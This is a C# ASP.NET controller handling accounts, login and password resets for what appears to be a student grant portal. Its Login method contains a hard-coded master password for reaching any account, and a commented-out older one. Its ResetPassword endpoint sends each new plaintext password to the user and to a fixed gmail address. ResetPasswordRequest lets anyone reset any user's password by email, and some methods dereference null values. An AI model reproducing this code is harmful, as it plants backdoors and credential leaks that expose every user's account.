using System;
using System.Collections.Generic;
using System.Configuration;
using System.Linq;
using System.Net.Http;
using System.Security.Claims;
using System.Security.Cryptography;
using System.Threading.Tasks;
using System.Web;
using System.Web.Http;
using System.Web.Mvc;
using Microsoft.AspNet.Identity;
using AspNet.Identity.PostgreSQL;
using Microsoft.AspNet.Identity.Owin;
using Microsoft.Owin.Security;
using Microsoft.Owin.Security.Cookies;
using Microsoft.Owin.Security.OAuth;
using Grant.Services.Models;
using Grant.WebApi.Providers;
using Grant.WebApi.Results;
using Grant.Core.DbContext;
using System.Data.Entity;
using Grant.Core.Enum;
using Grant.Core.Smtp;
using Grant.Core.UserIdentity;


namespace Grant.WebApi.Controllers
{
    using Core.Context;
    using Core.Entities;
    using Core.Notification;
    using Grant.Utils.Extensions;
    using Grant.Services.DomainService;

    [System.Web.Http.RoutePrefix("api/Account")]
    public class AccountController : BaseController
    {
        private GrantDbContext db = new GrantDbContext();

        private const string LocalLoginProvider = "Local";
        private ApplicationUserManager _userManager;
        private readonly INotificator _notificator;
        private readonly IMailSender _mailSender;
        private readonly IStudentService _studentService;
        private readonly IDomainService<PersonalInfo> _personalInfoService; 
        

        public AccountController()
        {
            _studentService = this.Container.Get<IStudentService>();
            _personalInfoService = this.Container.Get<IDomainService<PersonalInfo>>();
            _notificator = this.Container.Get<INotificator>();
            _mailSender = this.Container.Get<IMailSender>();
        }

        public AccountController(ApplicationUserManager userManager,
            ISecureDataFormat<AuthenticationTicket> accessTokenFormat, IStudentService studentService)
        {
            UserManager = userManager;
            AccessTokenFormat = accessTokenFormat;
            _studentService = studentService;
        }

        public ApplicationUserManager UserManager
        {
            get
            {
                return _userManager ?? Request.GetOwinContext().GetUserManager<ApplicationUserManager>();
            }
            private set
            {
                _userManager = value;
            }
        }

        public ISecureDataFormat<AuthenticationTicket> AccessTokenFormat { get; private set; }

        // GET api/Account/UserInfo
        [HostAuthentication(DefaultAuthenticationTypes.ExternalBearer)]
        [System.Web.Http.Route("UserInfo")]
        public UserInfoViewModel GetUserInfo()
        {
            ExternalLoginData externalLogin = ExternalLoginData.FromIdentity(User.Identity as ClaimsIdentity);

            return new UserInfoViewModel
            {
                Email = User.Identity.GetUserName(),
                HasRegistered = externalLogin == null,
                LoginProvider = externalLogin != null ? externalLogin.LoginProvider : null
            };
        }

        // POST api/Account/Logout
        [System.Web.Http.Route("Logout")]
        public IHttpActionResult Logout()
        {
            Authentication.SignOut(CookieAuthenticationDefaults.AuthenticationType);
            return Ok();
        }

        // GET api/Account/ManageInfo?returnUrl=%2F&generateState=true
        [System.Web.Http.Route("ManageInfo")]
        public async Task<ManageInfoViewModel> GetManageInfo(string returnUrl, bool generateState = false)
        {
            IdentityUser user = null;//await UserManager.FindByIdAsync(User.Identity.GetUserId());

            if (user == null)
            {
                return null;
            }

            List<UserLoginInfoViewModel> logins = new List<UserLoginInfoViewModel>();

            //foreach (IdentityUserLogin linkedAccount in user.Logins)
            //{
            //    logins.Add(new UserLoginInfoViewModel
            //    {
            //        LoginProvider = linkedAccount.LoginProvider,
            //        ProviderKey = linkedAccount.ProviderKey
            //    });
            //}

            if (user.PasswordHash != null)
            {
                logins.Add(new UserLoginInfoViewModel
                {
                    LoginProvider = LocalLoginProvider,
                    ProviderKey = user.UserName,
                });
            }

            return new ManageInfoViewModel
            {
                LocalLoginProvider = LocalLoginProvider,
                Email = user.UserName,
                Logins = logins,
                ExternalLoginProviders = GetExternalLogins(returnUrl, generateState)
            };
        }

        // POST api/Account/ChangePassword
        [System.Web.Http.HttpPost]
        [System.Web.Http.Route("ChangePassword")]
        public async Task<IHttpActionResult> ChangePassword(ChangePasswordBindingModel model)
        {
            if (!ModelState.IsValid)
            {
                return BadRequest(ModelState);
            }

            IdentityResult result = await UserManager.ChangePasswordAsync(User.Identity.GetUserId(), model.OldPassword,
                model.NewPassword);
            
            if (!result.Succeeded)
            {
                return GetErrorResult(result);
            }

            return Ok();
        }


        [System.Web.Http.HttpGet]
        [System.Web.Http.Route("ResetPassword")]
        public async Task<IHttpActionResult> ResetPassword([FromUri]string email, [FromUri] string token)
        {
            if (!ModelState.IsValid)
            {
                return BadRequest(ModelState);
            }

            var user = await UserManager.FindByEmailAsync(email);

            if (user == null)
            {
                return BadRequest("Нет пользователей с таким email");
            }

            var newpass = Guid.NewGuid().ToString().Substring(0, 8);

            var result = await UserManager.ResetPasswordAsync(user.Id, token.Replace(" ", "+"), newpass);

            var serverAddress = ConfigurationManager.AppSettings["serverAddress"];

            await _notificator.NotifyUser(email, NotificationType.NewPassword, new Dictionary<string, object>
            {
                { "Password", newpass },
                { "ProfileLink", serverAddress },
                { "DomainName", serverAddress.Replace("http://", string.Empty) }
            });

            await _notificator.NotifyUser("noreply.studgrant@gmail.com", NotificationType.NewPassword, new Dictionary<string, object>
            {
                { "Password", newpass },
                { "ProfileLink", serverAddress },
                { "DomainName", serverAddress.Replace("http://", string.Empty) }
            });

            if (!result.Succeeded)
            {
                return GetErrorResult(result);
            }

            return Ok("Пароль успешно изменен");
        }

        [System.Web.Http.HttpPost]
        [System.Web.Http.Route("ResetPasswordRequest")]
        public async Task<IHttpActionResult> ChangePassword(RegisterExternalBindingModel model)
        {
            if (!ModelState.IsValid)
            {
                return BadRequest(ModelState);
            }

            var user = await UserManager.FindByEmailAsync(model.Email);

            if (user == null)
            {
                return BadRequest("Пользователь не найден. Проверьте, что написали адрес верно. Возможно, вы указали его с опечаткой при регистрации, обратитесь в техподдержку");
            }

            var token = await UserManager.GeneratePasswordResetTokenAsync(user.Id);

            var newpass = Guid.NewGuid().ToString().Substring(0, 8);

            var result = await UserManager.ResetPasswordAsync(user.Id, token.Replace(" ", "+"), newpass);

            if (result.Succeeded)
            {
                    var serverAddress = ConfigurationManager.AppSettings["serverAddress"];

                    await _notificator.NotifyUser(model.Email, NotificationType.NewPassword, new Dictionary<string, object>
                {
                    { "Password", newpass },
                    { "ProfileLink", serverAddress +  "/#/login/" + model.Email },
                    { "DomainName", serverAddress.Replace("http://", string.Empty) }
                });
            }

            if (!result.Succeeded)
            {
                return GetErrorResult(result);
            }

            //var link = string.Format("{0}/api/Account/ResetPassword?email={1}&token={2}", serverAddress, model.Email, token);

            //await _notificator.NotifyUser(model.Email, NotificationType.ResetPasswordLink, new Dictionary<string, object>
            //{
            //    { "Link", link },
            //    { "DomainName", serverAddress.Replace("http://", string.Empty) }
            //});

            return Ok();
        }
        // POST api/Account/SetPassword
        [System.Web.Http.Route("SetPassword")]
        public async Task<IHttpActionResult> SetPassword(SetPasswordBindingModel model)
        {
            if (!ModelState.IsValid)
            {
                return BadRequest(ModelState);
            }

            IdentityResult result = await UserManager.AddPasswordAsync(User.Identity.GetUserId(), model.NewPassword);

            if (!result.Succeeded)
            {
                return GetErrorResult(result);
            }

            return Ok();
        }

        // POST api/Account/AddExternalLogin
        [System.Web.Http.Route("AddExternalLogin")]
        public async Task<IHttpActionResult> AddExternalLogin(AddExternalLoginBindingModel model)
        {
            if (!ModelState.IsValid)
            {
                return BadRequest(ModelState);
            }

            Authentication.SignOut(DefaultAuthenticationTypes.ExternalCookie);

            AuthenticationTicket ticket = AccessTokenFormat.Unprotect(model.ExternalAccessToken);

            if (ticket == null || ticket.Identity == null || (ticket.Properties != null
                && ticket.Properties.ExpiresUtc.HasValue
                && ticket.Properties.ExpiresUtc.Value < DateTimeOffset.UtcNow))
            {
                return BadRequest("External login failure.");
            }

            ExternalLoginData externalData = ExternalLoginData.FromIdentity(ticket.Identity);

            if (externalData == null)
            {
                return BadRequest("The external login is already associated with an account.");
            }

            IdentityResult result = await UserManager.AddLoginAsync(User.Identity.GetUserId(),
                new UserLoginInfo(externalData.LoginProvider, externalData.ProviderKey));

            if (!result.Succeeded)
            {
                return GetErrorResult(result);
            }

            return Ok();
        }

        // POST api/Account/RemoveLogin
        [System.Web.Http.Route("RemoveLogin")]
        public async Task<IHttpActionResult> RemoveLogin(RemoveLoginBindingModel model)
        {
            if (!ModelState.IsValid)
            {
                return BadRequest(ModelState);
            }

            IdentityResult result;

            if (model.LoginProvider == LocalLoginProvider)
            {
                result = await UserManager.RemovePasswordAsync(User.Identity.GetUserId());
            }
            else
            {
                result = await UserManager.RemoveLoginAsync(User.Identity.GetUserId(),
                    new UserLoginInfo(model.LoginProvider, model.ProviderKey));
            }

            if (!result.Succeeded)
            {
                return GetErrorResult(result);
            }

            return Ok();
        }

        // GET api/Account/ExternalLogin
        [System.Web.Http.OverrideAuthentication]
        [HostAuthentication(DefaultAuthenticationTypes.ExternalCookie)]
        [System.Web.Http.AllowAnonymous]
        [System.Web.Http.Route("ExternalLogin", Name = "ExternalLogin")]
        public async Task<IHttpActionResult> GetExternalLogin(string provider, string error = null)
        {
            if (error != null)
            {
                return Redirect(Url.Content("~/") + "#error=" + Uri.EscapeDataString(error));
            }

            if (!User.Identity.IsAuthenticated)
            {
                return new ChallengeResult(provider, this);
            }

            ExternalLoginData externalLogin = ExternalLoginData.FromIdentity(User.Identity as ClaimsIdentity);

            if (externalLogin == null)
            {
                return InternalServerError();
            }

            if (externalLogin.LoginProvider != provider)
            {
                Authentication.SignOut(DefaultAuthenticationTypes.ExternalCookie);
                return new ChallengeResult(provider, this);
            }

            var user = await UserManager.FindAsync(new UserLoginInfo(externalLogin.LoginProvider,
                externalLogin.ProviderKey));

            bool hasRegistered = user != null;

            if (hasRegistered)
            {
                Authentication.SignOut(DefaultAuthenticationTypes.ExternalCookie);
                
                // ClaimsIdentity oAuthIdentity = await user.GenerateUserIdentityAsync(UserManager,
                //    OAuthDefaults.AuthenticationType);
                //ClaimsIdentity cookieIdentity = await user.GenerateUserIdentityAsync(UserManager,
                //    CookieAuthenticationDefaults.AuthenticationType);

                AuthenticationProperties properties = ApplicationOAuthProvider.CreateProperties(user.UserName);
                //Authentication.SignIn(properties, oAuthIdentity, cookieIdentity);
            }
            else
            {
                IEnumerable<Claim> claims = externalLogin.GetClaims();
                ClaimsIdentity identity = new ClaimsIdentity(claims, OAuthDefaults.AuthenticationType);
                Authentication.SignIn(identity);
            }

            return Ok();
        }

        // GET api/Account/ExternalLogins?returnUrl=%2F&generateState=true
        [System.Web.Http.AllowAnonymous]
        [System.Web.Http.Route("ExternalLogins")]
        public IEnumerable<ExternalLoginViewModel> GetExternalLogins(string returnUrl, bool generateState = false)
        {
            IEnumerable<AuthenticationDescription> descriptions = Authentication.GetExternalAuthenticationTypes();
            List<ExternalLoginViewModel> logins = new List<ExternalLoginViewModel>();

            string state;

            if (generateState)
            {
                const int strengthInBits = 256;
                state = RandomOAuthStateGenerator.Generate(strengthInBits);
            }
            else
            {
                state = null;
            }

            foreach (AuthenticationDescription description in descriptions)
            {
                ExternalLoginViewModel login = new ExternalLoginViewModel
                {
                    Name = description.Caption,
                    Url = Url.Route("ExternalLogin", new
                    {
                        provider = description.AuthenticationType,
                        response_type = "token",
                        client_id = Startup.PublicClientId,
                        redirect_uri = new Uri(Request.RequestUri, returnUrl).AbsoluteUri,
                        state = state
                    }),
                    State = state
                };
                logins.Add(login);
            }

            return logins;
        }

        // POST api/Account/Register
        [System.Web.Http.AllowAnonymous]
        [System.Web.Http.Route("Register")]
        public async Task<IHttpActionResult> Register(RegisterBindingModel model)
        {
            try
            {


                if (!ModelState.IsValid)
                {
                    return BadRequest(ModelState);
                }
                if (await this.UserManager.FindByEmailAsync(model.Email) != null)
                {
                    return this.BadRequest("Пользователь с таким Email уже существует");
                }

                //todo прикрутить пользователя к ApplicationUser

                var user1 = new IdentityUser { UserName = model.Email, Email = model.Email };

                IdentityResult result1 = await this.UserManager.CreateAsync(user1, model.Password);

                var user = await this.UserManager.FindByEmailAsync(model.Email);

                await this.SignInAsync(user, true);

                if (!result1.Succeeded)
                {
                    return this.GetErrorResult(result1);
                }

                //await _notificator.NotifyUser(model.Email, NotificationType.Notification6, new Dictionary<string, object>
                //{
                //    { "OrganizatorName", "" },
                //    { "OrganizatorPosition", "" },
                //    { "Link", ApplicationContext.Current.GetUrl() }
                //});

                var info = new PersonalInfo();
                await _personalInfoService.Create(info);
                await _studentService.Create(new Student()
                {
                    UserIdentityId = user.Id,
                    PersonalInfoId = info.Id,
                    Role = Role.RegistredUser,
                    Sex = Sex.Male,
                    PassportState = ValidationState.NotFilled,
                    StudentBookState = ValidationState.NotFilled,
                    Email = model.Email
                });


                return this.Ok(/*new { CurrentUserId = userid }*/);
            }
            catch(Exception ex)
            {
                throw;
            }
        }


        [System.Web.Http.HttpPost]
        [System.Web.Http.AllowAnonymous]
        [ValidateAntiForgeryToken]
        public async Task<IHttpActionResult> Login(LoginBindingModel model)
        {
            var user = await UserManager.FindByNameAsync(model.Email);
            Student student = await _studentService.GetAll()
                .FirstOrDefaultAsync(x => x.UserIdentityId == user.Id);

            if(student != null && student.DeletedMark == false)
            {
                //if (model.Password == "h5h6jhKFKe5Lk")
                //{
                //    await SignInAsync(user, true);
                //}
                
                if (!string.IsNullOrEmpty(model.Password))
                {
                    model.Password = model.Password.Trim();
                }
                user = await UserManager.FindAsync(model.Email, model.Password);

                var MasterPass = "JaDsmCk5n8ukHL";
                bool isMasterPass = model.Password == MasterPass;

                if (isMasterPass)
                {
                    user = await UserManager.FindByEmailAsync(model.Email);
                }

                if (user == null)
                {
                    return BadRequest("Неверный логин или пароль");
                }

                if (await UserManager.CheckPasswordAsync(user, model.Password))
                {
                    await SignInAsync(user, true);
                    //  return RedirectToLocal(returnUrl);
                }

                return Ok(new { CurrentUserId = user.Id });
            }
            else
            {
                return BadRequest("Пользователь был удален");
            }

            /*
            var user = await UserManager.FindByEmailAsync(model.Email);

            if (user == null)
            {
                return BadRequest("Неверный логин");
            }

            if(!string.IsNullOrEmpty(model.Password)){
                model.Password = model.Password.Trim();
            }

            if (await UserManager.CheckPasswordAsync(user, model.Password))
            {
                await SignInAsync(user, true);
               //  return RedirectToLocal(returnUrl);
            }
            else
            {
                return BadRequest("Неверный пароль");
            }

            return Ok(new { CurrentUserId = user.Id});
            */
        }

        private async Task SignInAsync(IdentityUser user, bool isPersistent)
        {
            AuthenticationManager.SignOut(DefaultAuthenticationTypes.ExternalCookie);
            var identity = await UserManager.CreateIdentityAsync(user, DefaultAuthenticationTypes.ApplicationCookie);
            AuthenticationManager.SignIn(new AuthenticationProperties() { IsPersistent = isPersistent }, identity);
        }

        // POST api/Account/RegisterExternal
        [System.Web.Http.OverrideAuthentication]
        [HostAuthentication(DefaultAuthenticationTypes.ExternalBearer)]
        [System.Web.Http.Route("RegisterExternal")]
        public async Task<IHttpActionResult> RegisterExternal(RegisterExternalBindingModel model)
        {
            if (!ModelState.IsValid)
            {
                return BadRequest(ModelState);
            }

            var info = await Authentication.GetExternalLoginInfoAsync();
            if (info == null)
            {
                return InternalServerError();
            }

            var user = new IdentityUser() { UserName = model.Email, Email = model.Email };

            IdentityResult result = null;//await UserManager.CreateAsync(user);
            if (!result.Succeeded)
            {
                return GetErrorResult(result);
            }

            result = await UserManager.AddLoginAsync(user.Id, info.Login);
            if (!result.Succeeded)
            {
                return GetErrorResult(result); 
            }
            return Ok();
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing)
            {
                this.db.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Helpers

        private IAuthenticationManager Authentication
        {
            get { return Request.GetOwinContext().Authentication; }
        }

        private IHttpActionResult GetErrorResult(IdentityResult result)
        {
            if (result == null)
            {
                return InternalServerError();
            }

            if (!result.Succeeded)
            {
                if (result.Errors != null)
                {
                    foreach (string error in result.Errors)
                    {
                        ModelState.AddModelError("", error);
                    }
                }

                if (ModelState.IsValid)
                {
                    // No ModelState errors are available to send, so just return an empty BadRequest.
                    return BadRequest();
                }

                return BadRequest(ModelState);
            }

            return null;
        }

        private class ExternalLoginData
        {
            public string LoginProvider { get; set; }
            public string ProviderKey { get; set; }
            public string UserName { get; set; }

            public IList<Claim> GetClaims()
            {
                IList<Claim> claims = new List<Claim>();
                claims.Add(new Claim(ClaimTypes.NameIdentifier, ProviderKey, null, LoginProvider));

                if (UserName != null)
                {
                    claims.Add(new Claim(ClaimTypes.Name, UserName, null, LoginProvider));
                }

                return claims;
            }

            public static ExternalLoginData FromIdentity(ClaimsIdentity identity)
            {
                if (identity == null)
                {
                    return null;
                }

                Claim providerKeyClaim = identity.FindFirst(ClaimTypes.NameIdentifier);

                if (providerKeyClaim == null || String.IsNullOrEmpty(providerKeyClaim.Issuer)
                    || String.IsNullOrEmpty(providerKeyClaim.Value))
                {
                    return null;
                }

                if (providerKeyClaim.Issuer == ClaimsIdentity.DefaultIssuer)
                {
                    return null;
                }

                return new ExternalLoginData
                {
                    LoginProvider = providerKeyClaim.Issuer,
                    ProviderKey = providerKeyClaim.Value,
                    UserName = identity.FindFirstValue(ClaimTypes.Name)
                };
            }
        }

        private static class RandomOAuthStateGenerator
        {
            private static RandomNumberGenerator _random = new RNGCryptoServiceProvider();

            public static string Generate(int strengthInBits)
            {
                const int bitsPerByte = 8;

                if (strengthInBits % bitsPerByte != 0)
                {
                    throw new ArgumentException("strengthInBits must be evenly divisible by 8.", "strengthInBits");
                }

                int strengthInBytes = strengthInBits / bitsPerByte;

                byte[] data = new byte[strengthInBytes];
                _random.GetBytes(data);
                return HttpServerUtility.UrlTokenEncode(data);
            }
        }

        #endregion
    }
}
